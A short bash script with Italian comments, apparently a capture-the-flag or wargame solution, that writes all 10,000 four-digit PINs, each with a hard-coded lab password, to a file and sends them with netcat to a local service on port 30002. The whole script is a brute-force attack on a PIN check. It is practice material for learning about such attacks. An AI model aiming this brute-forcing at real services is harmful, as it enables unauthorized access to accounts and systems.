#!/bin/bash

flag="VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar"
file="/tmp/asdrubalebarca/pincodes.txt"

if [ ! -f "$file" ]; then		# Controlla che il file non esista già
	echo "Creazione del file contenente i PIN..."

	for i in $(seq -f "%04g" 0 9999)	# Numeri in formato 4 cifre (vedere --help)
	do

		echo "$flag $i" >> $file
	done
fi

echo "Invio dei PIN..."
nc localhost 30002 < /tmp/asdrubalebarca/pincodes.txt
